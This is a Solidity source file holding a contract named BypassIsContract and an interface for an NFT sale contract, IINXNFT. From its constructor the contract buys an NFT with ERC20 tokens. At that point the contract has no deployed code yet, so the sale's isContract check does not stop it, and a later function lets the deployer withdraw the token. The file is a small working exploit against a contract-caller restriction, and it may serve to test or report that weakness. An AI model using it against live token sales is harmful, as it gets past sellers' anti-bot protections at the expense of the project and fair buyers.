// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

// Uncomment this line to use console.log
// import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract BypassIsContract {
    address owner;
    address target;
    constructor(address erc20TokenAddress, address _target) {
        owner = msg.sender;
        target = _target;
        IERC20 token = IERC20(erc20TokenAddress);
        uint256 quantity = 1;
        uint256 price = IINXNFT(_target).price();
        require(token.transferFrom(msg.sender, address(this), price * quantity),"ERC20 transfer failed");
        require(token.approve(_target, price * quantity),"ERC20 approval failed");
        IINXNFT(_target).purchaseNFTV1(quantity);
    }
    function withdrawNFT(uint256 _tokenId) external {
        require(msg.sender == owner, "require only owner");
        IINXNFT(target).transferFrom(address(this), msg.sender, _tokenId);
    }
}

interface IINXNFT {
    function setMerkleRoot(bytes32 _merkleRoot) external;

    function transferFrom(address from, address to, uint256 tokenId) external;

    function startPublicSale() external;

    function stopPublicSale() external;

    function mintReserve(uint256 quantity) external;

    function purchaseNFTV1(uint256 quantity) external;

    function purchaseNFT(uint256 quantity) external;

    function purchaseNFTWhitelist(
        uint256 quantity,
        bytes32[] calldata merkleProof
    ) external;

    function hashLeaf() external view returns (bytes32);

    function addToWhitelist(
        address[] calldata addresses,
        uint256[] calldata purchaseLimits
    ) external;

    function removeFromWhitelist(address[] calldata addresses) external;

    function purchaseNFTWhitelist(uint256 quantity) external;

    // Optional: Functions to retrieve data from the contract
    function token() external view returns (address);

    function price() external view returns (uint256);

    function whitelistPrice() external view returns (uint256);

    function maxSupply() external view returns (uint256);

    function whitelistMaxPurchase() external view returns (uint256);

    function merkleRoot() external view returns (bytes32);

    function whitelistMinted(address) external view returns (uint256);

    function publicSaleOpen() external view returns (bool);

    function totalSupply() external view returns (uint256);
}
